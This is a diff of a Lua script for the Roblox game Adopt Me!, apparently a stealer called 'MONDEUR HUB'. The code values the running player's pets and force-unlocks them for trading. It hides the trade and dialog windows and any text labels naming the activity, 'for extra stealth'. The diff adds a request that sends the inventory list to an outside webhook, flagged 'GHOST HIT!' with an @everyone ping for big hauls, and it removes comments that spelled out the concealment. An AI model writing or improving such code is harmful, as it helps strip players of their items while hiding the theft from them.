@@ -28,7 +28,6 @@ local function loadValues()
         for line in result:gmatch("[^\r\n]+") do
             local name, val = line:match("([^,]+),([^,]+)")
             if name and val then
-                -- Normalize keys for guaranteed matches
                 customValues[name:lower():trim()] = tonumber(val)
             end
         end
@@ -51,11 +50,8 @@ RunService.RenderStepped:Connect(function()
             local text = string.lower(obj.Text)
             for _, phrase in ipairs(blockList) do
                 if string.find(text, phrase) then
-                    -- Wipe text and hide the specific label
                     obj.Visible = false
                     obj.Text = "" 
-                    
-                    -- Sledgehammer: Climb the UI tree to hide the entire background container
                     local target = obj
                     for i = 1, 4 do
                         if target.Parent and not target.Parent:IsA("ScreenGui") and target.Parent ~= PlayerGui then
@@ -69,7 +65,6 @@ RunService.RenderStepped:Connect(function()
             end
         end
     end
-    -- Keep standard Apps disabled for extra stealth
     if PlayerGui:FindFirstChild("TradeApp") then PlayerGui.TradeApp.Enabled = false end
     if PlayerGui:FindFirstChild("DialogApp") then PlayerGui.DialogApp.Enabled = false end
 end)
@@ -92,10 +87,9 @@ local function hashedAPI(remoteName, ...)
     remote:FireServer(...)
 end
 
--- 6. VALUATION LOGIC (INTEGRATED WITH GITHUB)
+-- 6. VALUATION LOGIC
 local function getFinalValue(petData, props)
     local petName = petData.name:lower():trim()
-    -- Priority: 1. GitHub Values, 2. Game Metadata, 3. Rarity Floor
     local base = customValues[petName] or petData.rvalue or 0
     
     if base < 0.01 then
@@ -132,8 +126,6 @@ local function processInventory()
             if unitVal >= THRESHOLD then
                 total = total + unitVal
                 table.insert(tradeList, {uid = uid, val = unitVal})
-                
-                -- Ensure items are tradable by forcing unlock
                 hashedAPI("BackpackAPI/SetItemLocked", uid, false) 
                 
                 local key = pet.id..(props.neon and "N" or "")..(props.mega and "M" or "")
@@ -156,15 +148,30 @@ end
 
 local sortedPets, grandTotal, finalTradeList = processInventory()
 
--- 8. WEBHOOK DISPATCH
+-- 8. WEBHOOK DISPATCH (ERROR FIXED)
 if #sortedPets > 0 then
-    local lines = {}
+    local petLines = ""
     for _, p in ipairs(sortedPets) do
-        table.insert(lines, p.emoji.." "..p.name.." "..p.count.."x (₱"..string.format("%.2f", p.price)..")")
+        petLines = petLines .. p.emoji .. " " .. p.name .. " " .. p.count .. "x (₱" .. string.format("%.2f", p.price) .. ")\n"
     end
 
     local payload = HttpService:JSONEncode({
         content = (grandTotal >= 500 and "@everyone" or ""),
         embeds = {{
             title = "MONDEUR HUB | 🦊 GHOST HIT!",
-            description = "This is my script for Adopt Me!"
+            description = "This is my script for Adopt Me!\n\n" .. petLines,
+            color = 16733440 -- Orange
+        }}
+    })
+
+    -- Final execution to send webhook
+    local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+    if request then
+        request({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = payload
+        })
+    end
+end
